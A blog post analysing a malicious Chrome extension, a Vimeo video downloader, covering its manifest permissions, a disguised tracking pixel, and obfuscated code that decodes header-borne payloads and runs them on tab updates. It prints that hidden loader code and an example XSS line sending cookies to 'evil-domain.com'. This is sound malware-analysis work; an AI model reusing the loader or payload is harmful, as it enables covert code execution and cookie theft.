# Extensions: Google Chrome's Soft Underbelly (Part 1)

Since Chrome v9, Chrome extensions have been a core part of the browser's functionality powered by the browser's comprehensive extensions API. The sheer size of the Chrome Web Store with over 190,000 extensions/web apps and over 1.2 billion installs is a testament to how successful this launch was. Extensions add a wide range of possible capabilities and can be installed in seconds from the Chrome Web Store. Some extensions such as LastPass, uBlock Origin, Tampermonkey, and more have enjoyed immense success on the platform. Smaller independent developers, like myself, are also able to develop themes and extensions all with a one-time payment of $5 to register as a developer. This allowed my high school self to launch a theme called [Material Dark](https://chrome.google.com/webstore/detail/material-dark/npadhaijchjemiifipabpmeebeelbmpd?hl=en-US) which has over 300,000 users around the world.

Despite these benefits, the platform has been become a [prime attack vector for hackers](https://www.tomsguide.com/news/chrome-extension-spyware#:~:text=More%20than%20100%20malicious%20and,browser%20and%20spread%20dangerous%20spyware.) to perform spying and phishing attacks. According to [Statista](https://www.statista.com/statistics/544400/market-share-of-internet-browsers-desktop/#:~:text=Global%20desktop%20internet%20browsers%20market%20share%202015%2D2020&text=As%20of%20September%202020%2C%20Google,points%20in%20just%20three%20years.), Chrome makes up roughly 70% of today's browser market share. Chrome's large user base allows attackers to consolidate their attacks on Chrome itself. Also, browsers like Edge and many other *Chrome clones* are can install malicious extends through the Chrome store as they are compatible.

Throughout the years, there is more and more evidence that malicious Chrome extensions pose a larger threat to users. In 2015, Google [removed over 200 ad injecting extensions](https://arstechnica.com/information-technology/2015/04/google-kills-200-ad-injecting-chrome-extensions-says-many-are-malware/) from their store. In 2020, we still face a similar issue where this time, [attackers are going after our browsing behaviors](https://www.reuters.com/article/us-alphabet-google-chrome-exclusive/exclusive-massive-spying-on-users-of-googles-chrome-shows-new-security-weakness-idUSKBN23P0JO). It seems that thwarting all possible malicious extensions is a never-ending race.

Attackers employ a range of strategies to lure unsuspecting users into their trap. The most basic types of attacks on the Chrome store are extensions that pose as other legitimate extensions out there such as [Snapchat for Chrome](https://chrome.google.com/webstore/detail/snapchat-for-chrome/dhcjddnandoaonmnidbdnbbkmlmmnell?hl=en-US). Higher level attacks include injecting advertisements into a page, redirecting users to phishing sites, tracking user browsing behavior, stealing user credentials from sites, mining Bitcoin, and more. Despite Chrome's more rigid [Content Security Policy](https://developers.google.com/web/fundamentals/security/csp) enforced a couple of years ago, these malicious attacks can very well still occur if a loophole is found.

![Fake Facetime Extension](https://raw.githubusercontent.com/Spiderpig86/blog/master/images/Extensions%20Google%20Chromes%20Soft%20Underbelly%20Part%201/facetime.PNG)
*This extension is a grim reminder that we live in a world where over 10,000 people think Facetime is available on Chrome.*

Today, attackers have gotten more crafty with their attacks. Popular extensions with a large and trusting community are now sometimes sold to those who have harmful intentions. Attackers can modify the source to include malicious code. Thanks to [Chrome's Autoupdate](https://support.google.com/chrome/a/thread/3050651?hl=en) feature for extensions, the now harmful extension can reach most Chrome users in days. A notable example of this is [NanoAdblocker](https://github.com/NanoAdblocker/NanoCore/issues/362#issuecomment-709428210).

Most of the articles written regarding the latest batch of banned extensions have been quite shallow, so I hope this series of blog posts will help shed some light on what these extensions are doing with your browsing data.

## First Look: Vimeo Video Downloader

On November 19th, 2020, security researchers in Cz.nic, a domain registration company for `.cz` domains, discovered extensions that were [covertly tracking browsing habits](https://translate.google.com/translate?sl=cs&tl=en&u=https://blog.nic.cz/2020/11/19/hledani-skodliveho-kodu-mezi-doplnky/). Avast confirmed [28 more extensions](https://press.avast.com/third-party-browser-extensions-from-instagram-facebook-vimeo-and-others-infected-with-malware) were also tracking browsing behavior upwards of 3 million users and redirecting users based on the current website they are trying to access to monetize traffic. According to Avast's post, *the [virus](https://www.avast.com/c-computer-virus) detects if the user is googling one of its domains or, for instance, if the user is a web developer and, if so, won't perform any malicious activities on their browsers. It avoids infecting people more skilled in web development, since they could more easily find out what the extensions are doing in the background.* 

As an example, I will be analyzing [Vimeo™ Video Downloader](https://chrome.google.com/webstore/detail/vimeo-video-downloader/cgpbghdbejagejmciefmekcklikpoeel?hl=en) for this series of blog posts.

As of 12/18, this extension was no longer available to be downloaded from the Chrome Web Store, but we can still see the stats [here](https://chrome-stats.com/d/cgpbghdbejagejmciefmekcklikpoeel). In the final days of the extension's existence, it was able to rack up 4.77 stars with 766 reviews and 510,424 total weekly users. This by no means was an unpopular extension and it is probably not the last we will see of these malicious extensions.

## Installation

> Disclaimer: I am by no means a security researcher or even an expert. I just happen to have an affinity for studying vulnerabilities and this is my experience in stepping through what the extension does. I do not encourage people to obtain a copy of these extensions without taking the necessary precautions (use a virtual machine, a VPN, edit hosts list to allow/block ingress and egress to malicious hosts, etc.)

To install, you will have to enable **developer mode** in `chrome://extensions` and click on `Load Unpacked` if you have an unzipped copy of the extension. However, this is not enough since Chrome will disable the extension after a couple of minutes. To fix this, you need to change the ID of the Chrome extension. This can be done by removing the `key` and `differential_fingerprint` fields in `manfiest.json`. Once that’s done, perform the first step again and the extension should be loaded with a brand new ID.

## Initial Look at the Code

Given that the extension was flagged, I was curious to see the code that got this flagged in the first place. One tool that is great for viewing the source of Chrome extensions without having to download it is [CrxViewer](https://robwu.nl/crxviewer/). If you already have the source, any editor like VSCode would work just as well, if not better.

> *Wait, where's the link to the code?* To remove any liability of me "distributing" code that can be used for bad intentions, I will not be providing the full source. You, the reader, have full liberty to seek it for yourself. 😎

Running `tree` yields the following directory structure:

```
.
├── css
│   ├── content.css
│   ├── popup.css
│   └── thankyou.css
├── fonts
│   ├── ...
├── img
│   ├── ...
├── js
│   ├── bg_script.js
│   ├── jquery.js
│   ├── popup.js
│   ├── thankyou.js
│   ├── tippy.all.js
│   └── vimeo_com.js
├── _locales
│   ├── ...
├── manifest.json
├── popup.html
└── thankyou.html

52 directories, 84 files
```

The part of the source I will focus on is the `js` folder, which is the meat of the extension.

### Manifest File

A glance at the extension’s manifest file should give us some hint as to what this extension can do. The first section I looked into was the `background` section since background scripts are typically responsible for what is run inside the extension window itself. Strangely, the `persistent` flag is set to `true`, which according to Chrome’s documentation, means the extension uses the *[chrome.webRequest API](https://developer.chrome.com/docs/extensions/reference/webRequest/)*. To give the creator the benefit of the doubt, let's say this API is used for fetching the videos to be downloaded rather than pinging some remote server.

```json
"background": {
    "persistent": true,
    "scripts": [ "js/jquery.js", "js/bg_script.js" ]
}
```

In the `content_scripts` section, it states that the script will execute for all frames in the page using `jquery.js` and `vimeo_com.js`. These files will most likely be responsible for the functionality of the extension itself, which is to fetch all videos on a given page and their download URLs.

```json
"content_scripts": [ {
    "all_frames": true,
    "css": [ "css/content.css" ],
    "js": [ "js/jquery.js", "js/vimeo_com.js" ],
    "matches": [ "*://*.vimeo.com/*" ],
    "run_at": "document_end"
} ],
```

Moving onto the next section, the extension’s **CSP** (content security policy) dictates what the script and cannot do to help prevent things such as XSS attacks. What is a big red flag in this extension that is allowed is using the `eval` function by including the `unsafe-eval` flag in the `content_security_policy` field. According to [this StackOverflow question](https://stackoverflow.com/questions/45072882/adding-unsafe-eval-to-existing-chrome-extension), the inclusion of `unsafe-eval` should’ve flagged this extension for manual review, but somehow it still made it to the Chrome store. Some info I found about the review process can be read [here](https://developer.chrome.com/docs/webstore/faq/#faq-listing-08).

```json
"content_security_policy": "script-src 'self' https://*.vimeo.com 'unsafe-eval'; object-src https://*.vimeo.com 'self'",
```

Anything allowing the use of `eval` should raise suspicion since it runs any JS code that is represented as a string. The dangers of this function are pretty [well](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) [documented](https://www.digitalocean.com/community/tutorials/js-eval). As a quick example, an innocent looking snippet can be modified to send `httpOnly` cookies to the attacker’s domain.

```js
// app.js
eval('alert("Your query string was ' + unescape(document.location.search) + '");');

// Then, we can set the query parameter of the current URL to something like this to perform XSS:
// http://test.com?param%22);new Image().src='https://evil-domain.com/?cookie='+escape(document.cookie)
```



The last notable section is the `permissions` key in the manifest file. 

```json
"permissions": [ "webRequest", "storage", "tabs", "downloads", "<all_urls>", "management", "cookies" ]
```

Some points of interest include the fact that the extension can send web requests, read your tabs, read your downloads, execute on any page (from `<all_urls>` rule), read all your extensions, and all your cookies for any page.

### bg_script.js

As stated above, the one thing that seemed suspicious was the fact that the background script was set to be persistent, which is usually not the case in many extensions. With this in mind, the question becomes, what requests could the extension possibly need to make?

Upon loading the file, the code is an absolute hot mess. However, it’s not something any JS beautifying tool can’t fix.

![Minified code](https://raw.githubusercontent.com/Spiderpig86/blog/master/images/Extensions%20Google%20Chromes%20Soft%20Underbelly%20Part%201/minified.PNG)

Starting from the top, one block of code stood out in particular. One of the registered handlers listened to responses sent from a server defined in `x[2]` and all the response headers greater than 20 chars in length were saved in local storage.

```js
chrome.webRequest.onCompleted.addListener(function(a) {
    a.responseHeaders.forEach(function(a) {
        a.value && a.value.length > 20 && (localStorage[a.name.toLowerCase()] = a.value)
    })
}, {
    urls: ["*://" + x[2] + "*"],
    types: ["image"]
}, ["responseHeaders"]),
```

A quick search to find what got pushed into array `x` shows that we are listening to a domain called `count.users-analytics.com`. To me, this was a very strange URL for anyone to use to get extension usage analytics. This was certainly not something associated with Google Analytics.

```js
C = function() {
    x.push(y), x.push(E);
    var a = "count.users-analytics.com/";
    x.push(a)
},
```

![WHOIS](https://raw.githubusercontent.com/Spiderpig86/blog/master/images/Extensions%20Google%20Chromes%20Soft%20Underbelly%20Part%201/whois.PNG)

Nothing really useful came out of trying to find out the WHOIS information for the domain itself. The only piece of info that could be useful is its 2020-12-03 15:27:18 UTC registration date, indicating it was very recent. Out of curiosity, I pinged `users-analytics.com` and received no response. However, `count.users-analytics.com` actually did return a response in the form of a 1x1 GIF. At first, I wasn’t sure why a GIF was returned but then it hit me that this acts as a [tracking pixel](https://en.wikipedia.org/wiki/Web_beacon). In short, a tracking pixel is a technique used by websites to see if users loaded an email, webpage, etc. It usually is in the form of a 1x1 GIF which makes it invisible to the typical user.

![wget](https://raw.githubusercontent.com/Spiderpig86/blog/master/images/Extensions%20Google%20Chromes%20Soft%20Underbelly%20Part%201/wget.PNG)

Now to me, this doesn’t seem to be too big of an issue since this is the same technique employed by Google, Facebook, Microsoft, etc. for their trackers. However, it is sending information to some unknown domain which is very suspect. The URL requested is in the form of:

```
https://count.users-analytics.com/count.gif?_e_i=downl-imeo&ed_=aaaaaaaabci&_vv=1.1.9&r=0.0001&_l=en-US&_k=br&t=1600000000000&_idu=5wxzrw3585ososi1
```
*Query parameters have been edited for privacy.*

To summarize the query parameters (important ones at least):

* `_e_i` and other variants - the identifier for the extension being used which is randomly chosen.

  ```js
  function m() {
      var a = ["ee", "e", "e_", "e_i", "_e_i", "nm", "tid", "_gid", "aip", "c_id", "edi", "_eid", "_e_id"],
          b = r();
      return h(a, b)
  }
  
  function r() {
      var a = ["dwnld", "dnl", "downl", "dwn", "downld", "dlder", "dwnl", "dlr", "dwonlo", "dler"],
          b = ["vimeo", "vmeo", "vimo", "vime", "imeo", "ime"],
          c = ["-", "_", ":"],
          d = c[f(c)],
          e = f(a),
          g = f(b),
          h = s([a[e], b[g]]);
      return h.join(d)
  }
  ```

  

  * `_vv` and other variants - the version of the extension.
  * `r` and other variants - some random value from `Math.random()`.

  ```js
  function p() {
      var a = ["r", "rnd", "z", "_z", "_r", "_rnd"],
          b = Math.random();
      return h(a, b)
  }
  ```

  

  * `_l` and other variants - your locale.
  * `t` and other variants - timestamp the extension was installed.
  * `_idu` and other variants - an identifier that identifies you as the user. This ID is first generated when you install the extension and is stored within Chrome’s storage API.

  ```js
  function a() {
      return "xxxexxxsxxxxxxxx".replace(/[xy]/g, function(a) {
          var b = 16 * Math.random() | 0,
              c = "x" === a ? b : 3 & b | 8;
          return c.toString(16)
      })
  }
  ```

The request to this dingy analytics domain is triggered within this function `t`.

```js
function t(a) {
    var b = new Image,
        c = Math.random();
    c += 1, c > 2 ? b.src = ["https://www.google-analytics.com/_utm.gif?", m(), k(), l(), i(), n(), j(a), p()].join("").replace(/&$/, "") : b.src = ["https://", x[2], g(), q(), m()].concat(s([k(), l(), i(), n(), o(), j(a), p()])).join("").replace(/&$/, "")
}
```

Notice how the Google Analytics URL is also shown, but don’t let that fool you. If you read this carefully, you’ll see that the condition `c > 2` is always false. `c` starts as a number from 0 (inclusive) to 1 (exclusive). The code subsequently adds 1, but the resulting value is never greater than 2. A request will always be made to the URL stored in `x[2]`, which is `counter.users-analytics.com`. How cheeky.

```js
// Better Readability
function t(a) {
    var b = new Image,
        c = Math.random(); // 0 <= c < 1
    c += 1; // 1 <= c < 2
    if (c > 2) {
        b.src = ["https://www.google-analytics.com/_utm.gif?", m(), k(), l(), i(), n(), j(a), p()].join("").replace(/&$/, "")
    } else {
        b.src = ["https://", x[2], g(), q(), m()].concat(s([k(), l(), i(), n(), o(), j(a), p()])).join("").replace(/&$/, "")
    }
}
```

##### Strange String Function

The script also adds a new function for strings that does some form of manipulation or encoding.

```js
String.prototype.strvstrevsstr = function() {
    var a = this;
    this.length % 4 != 0 && (a += "===".slice(0, 4 - this.length % 4)), a = atob(a.replace(/\-/g, "+").replace(/_/g, "/"));
    var b = parseInt(a[0] + a[1], 16),
        c = parseInt(a[2], 16);
    a = a.substr(3);
    var d = parseInt(a);
    if (a = a.substr(("" + d).length + 1), d != a.length) return null;
    for (var e = [String.fromCharCode], f = 0; f < a.length; f++) e.push(a.charCodeAt(f));
    for (var g = [], h = b, i = 0; i < e.length - 1; i++) {
        var j = e[i + 1] ^ h;
        i > c && (j ^= e[i - c + 1]), h = e[i + 1] ^ b, g.push(e[0](j))
    }
    return g.join("");
}
```

Obviously, someone doesn't want people like me to be snooping around their extension. Without actually using this extension, we won’t know what this is used for other than how it is called in some parts of the code.

`strvstrevsstr` gets invoked if we can find a string that is greater than 10 chars in length in the string stored in local storage with the key `cache-control` (for some reason now it filters for 10 chars rather than 20 as stated earlier). The `cache-control` header [typically holds these values](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control), but nothing stops a bad actor from inserting additional information into the field, like an encoded string. Without running the extension, it isn’t too clear what is going on with this function. What we can tell from reading this code is that once `e` is decoded in some form with `strvstrevsstr` and parsed as a JSON object, its object entries are written to window. `A` gets set to true to possibly indicate that this step has been completed.

```js
getMediaPath: function() {
    var a = window.localStorage;
    if (a["cache-control"]) {
        var b = a["cache-control"].split(",");
        try {
            var c;
            for (var d in b) {
                var e = b[d].trim();
                if (!(e.length < 10)) try {
                    if (c = e.strvstrevsstr(), c = "undefined" != typeof JSON && JSON.parse && JSON.parse(c), c && c.cache_c) {
                        for (var f in c) window[f] = c[f];
                        A = !0;
                        break
                    }
                } catch (g) {}
            }
        } catch (g) {}
        this.setMediaPath()
    }
}
```

Subsequently, `setMediaPath` is called as part of some callback to store something into local storage with the key `cfg_audio_id`.
```js
setMediaPath: function() {
    "undefined" != typeof jj && jj && uu && gg > jj && window[jj][gg](uu, function(a) {
        var b = "cfg_audio_id";
        localStorage[b] = a
    })
}
```

##### Hit and Run Function

Interesting how this function seems to call something using whatever that is stored in `cfg_audio_id` and then deleting it right after.

```js
findDetails: function() {
    if ("undefined" != typeof ee) {
        var a = "cfg_audio_id";
        localStorage[a] && window[ee](localStorage[a]);
        delete localStorage[a];
    }
}
```

Tracing the callers shows that `findDetails` is called as part of some callback function with a delay of `1500ms`.

```js
function e(a, b, c) {
    b.url && (b.url.indexOf("vimeo.com") > -1 && chrome.tabs.sendMessage(a, "url_changed"), A || (setTimeout(function() {
        D.findDetails();
    }, 1500), console.trace('set'), B.getMediaPath()))
}
```

The function `e` is triggered as an event listener for when chrome tabs are updated.

```js
chrome.tabs.onRemoved.addListener(function(a, b) {
            var c = w.indexOf(a);
            c > -1 && w.splice(c, 1)
        }), chrome.tabs.onUpdated.addListener(e), chrome.browserAction.onClicked.addListener(D.openVimeoByClickListener), "config" == localStorage.userSettings && D.addStringParser()
```

According to [Chrome's documentation](https://developer.chrome.com/docs/extensions/reference/tabs/#event-onUpdated), the `onUpdated` event fires whenever any of the following changes:

![onUpdate Events](https://raw.githubusercontent.com/Spiderpig86/blog/master/images/Extensions%20Google%20Chromes%20Soft%20Underbelly%20Part%201/onUpdate.PNG)

If these findings tell us anything, it's that the extension is trying to execute some code whenever the tab gets updated. Once executed, it deletes itself to hide from the user.

##### This Extension Has Friends

Normally, sometimes extensions will disable themselves if it encounters another extension it does not mesh well with. In the extension code itself, we see that there is a whole list of extension ids that would cause this extension to stop working and alert the user that a conflict exists.

```js
var J = ["phpaiffimemgakmakpcehgbophkbllkf", "ocaallccmjamifmbnammngacjphelonn", "ckedbgmcbpcaleglepnldofldolidcfd", "ejfanbpkfhlocplajhholhdlajokjhmc", "egnhjafjldocadkphapapefnkcbfifhi", "dafhdjkopahoojhlldoffkgfijmdclhp", "lhedkamjpaeolmpclkplpchhfapgihop"]; // Other malicious extensions
chrome.management.getAll(function(a) {
    a.forEach(function(a) {
        "extension" === a.type && a.enabled && J.indexOf(a.id) > -1 && (v = !0)
    })
})
```

Most likely this is included to not obstruct other extensions that are also doing the same malicious deed. I took a look at the list of extension ids and it seems that they are all Vimeo video downloaders that have either been removed from the Chrome Web Store or are continuing to infect users.

```js
connect: function(a) {
    var b = this,
        c = this.activeList,
        d = a.sender.tab.id;
    c[d] = this.activeList[d] || {}, c[d][a.name] = a, a.onDisconnect.addListener(function(a) {
        delete c[d][a.name], 0 == Object.keys(c[d]).length && delete c[d]
    }), a.onMessage.addListener(function(a, c) {
        "video_found" == a.action && (b.addVideo(d, c.name, a.found_video), u(d, b.getVideos(d).length), I.newVideoFound(a.found_video))
    }), v && a.postMessage("conflict_exists") // Received by content script
},
```

```js
// vimeo_com.js (content script)
run: function() {
    this.port = chrome.runtime.connect({
        name: Math.random().toString()
    }), this.port.onMessage.addListener(function(b, c) {
        "conflict_exists" === b && (a.videoFeed.btnClassNameConflict = "exist_conflict_btn")
    }), this.mutationMode.enable()
},
```

### Other Scripts

The other scripts did not seem to have anything too out of the ordinary that could be malicious. For now, I will skip talking about these.

## Closing Thoughts

When I first tested this extension with minimal and basic usage, it seems like nothing was inherently wrong. The extension worked as stated.

Initially, the red flags that caught my eye were the tracking pixel requested from an unknown host and the scrambled code intended to mislead any user like me. I wasn’t entirely sure if the extension was banned purely for the reason of having a tracking pixel residing in an unknown domain. There had to be more to it that warranted its expulsion from the Chrome Web Store. Looking closer at the code revealed that something was being executed on tab update events. But what is it?